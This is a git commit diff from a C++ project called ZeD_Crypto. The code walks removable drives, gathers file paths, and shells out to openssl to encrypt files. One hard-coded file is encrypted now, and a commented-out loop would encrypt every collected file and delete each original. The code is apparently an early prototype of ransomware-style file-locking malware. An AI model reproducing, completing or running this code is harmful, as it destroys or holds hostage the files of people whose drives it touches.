e15a58fe605fd6acdf1c011f3f814d7de19ef361
ArtZetD <56314346+ArtZetD@users.noreply.github.com>
2022-10-30 19:54:04 +0300

    test to change variable in vector paths

--- ZeD_Crypto/ZeD_Crypto.cpp
+++ ZeD_Crypto/ZeD_Crypto.cpp
@@ -43,32 +43,38 @@ void get_files(std::vector<std::string>& paths, LPCTSTR root_path)
 	}
 }
 
-int main()
+void fill_paths(std::vector<std::string>& paths)
 {
-
-	TCHAR sz_buffer[256];  
-	LPCTSTR buffer_ptr = sz_buffer; 
+	TCHAR sz_buffer[256];
+	LPCTSTR buffer_ptr = sz_buffer;
 	GetLogicalDriveStrings(255, sz_buffer);
-	std::vector<std::string> paths;
 
-	//system("C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//test.txt -pass passwd.txt"); //-"openssl aes-256-cbc -a -salt -pbkdf2 -in C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//testenc.txt"
-	
-	 std::string ENCRYPT_COMMAND = "openssl aes-256-cbc -a -salt -pbkdf2 -in ";
-	 std::string DECRYPT_COMMAND = "openssl aes-256-cbc -d -a -salt -pbkdf2 -in ";
-
-
-	for (buffer_ptr; *buffer_ptr != '\0'; buffer_ptr += _tcsclen(sz_buffer) + 1) 
+	for (buffer_ptr; *buffer_ptr != '\0'; buffer_ptr += _tcsclen(sz_buffer) + 1)
 	{
 		if (GetDriveType(buffer_ptr) == DRIVE_REMOVABLE)
 		{
 			get_files(paths, buffer_ptr);
-		}	
+		}
 	}
+}
+int main()
+{
+	std::vector<std::string> paths;
 
-	for (size_t i = 2; i < paths.size(); ++i)
-	{
-		ENCRYPT_COMMAND += paths[i] + "-out " + paths[i];
-	}
+	//system("C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//test.txt -pass passwd.txt"); //-"openssl aes-256-cbc -a -salt -pbkdf2 -in C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//testenc.txt"
+	
+	 std::string ENCRYPT_COMMAND = " ";
+	 std::string DECRYPT_COMMAND = "openssl aes-256-cbc -d -a -salt -pbkdf2 ";
+
+	  fill_paths(paths);
+	
+	  system("openssl aes-256-cbc -a -salt -pbkdf2 -in W://very_important_dir//very_important_subdir//not_super_important_dir//secret2//filefilefileencrypnewnew.txt -out W://very_important_dir//very_important_subdir//not_super_important_dir//secret2//filefilefileencrypnewnew.encr");
+	//for (size_t i = 2; i < paths.size(); ++i)
+	//{
+	//	ENCRYPT_COMMAND += "-in " + paths[i] + " -out " + paths[i].erase(paths[i].find_last_of('.'), paths[i].size()) + ".encr";
+	//	system(ENCRYPT_COMMAND.c_str());
+	//	remove(paths[i].c_str());
+	//}
 
 	
 }
